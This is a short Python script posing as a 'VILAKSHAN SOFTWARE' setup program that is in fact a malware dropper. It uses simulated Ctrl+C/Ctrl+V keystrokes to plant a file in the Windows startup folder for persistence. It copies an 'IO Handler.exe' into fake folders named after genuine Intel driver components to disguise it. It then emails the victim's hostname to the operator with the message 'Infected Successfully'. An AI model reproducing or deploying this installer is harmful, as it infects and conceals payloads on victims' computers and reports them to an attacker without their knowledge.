import time
import os
from Mail_hotmail import mail
from pynput.keyboard import Controller,Key
import socket
keyboard = Controller()
print ('='*30,'\n\n\t\tWELCOME TO VILAKSHAN SOFTWARE\n\nNote: After pressing enter select \"windows.desktop\" \n','='*30)
auth = input('Software Authentication Key : ')
if (auth == 'vilakshan7'):
    source = input('Enter \"Da Source of IO Handler\" : ')
    for i in range(5, 0, -1):
        print(i)
        time.sleep(1)
    keyboard.press(Key.ctrl)
    keyboard.press('c')
    keyboard.release('c')
    keyboard.release(Key.ctrl)
    os.system('start shell:startup')
    time.sleep(1)
    keyboard.press(Key.ctrl)
    keyboard.press('v')
    keyboard.release(Key.ctrl)
    keyboard.release('v')
    time.sleep(2)
    keyboard.press(Key.alt)
    keyboard.press(Key.f4)
    keyboard.release(Key.f4)
    keyboard.release(Key.alt)
    os.system("md C:\\Program_Files")
    os.system("md C:\\Program_Files\\Intel")
    os.system("md \"C:\\Program_Files\\Intel\\Intel(R) Dynamic Platform and Thermal Framework\"")
    os.system("md \"C:\\Program_Files\\Intel\\Intel(R) Chipset Device Software\"")
    os.system("md \"C:\\Program_Files\\Intel\\Intel(R) Management Engine Components\"")
    os.system("md \"C:\\Program_Files\\Intel\\Intel(R) Serial IO\"")
    os.system("md \"C:\\Program_Files\\Intel\\Media Resource\"")
    os.system("copy \""+source+"\\IO Handler.exe\" \"C:\\Program_Files\\Intel\\Intel(R) Management Engine Components\\IO Handler.exe\"")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
print("Completed")
target = socket.gethostname()
message = '''
Greetings Sir,
I, hereby want to tell you that ''' + target + ''' has been corrupted successfully
Regards,
Yours SETUP Program'''
mail('INTEL report from ' + target + '\nInfected Successfully\n' + message)
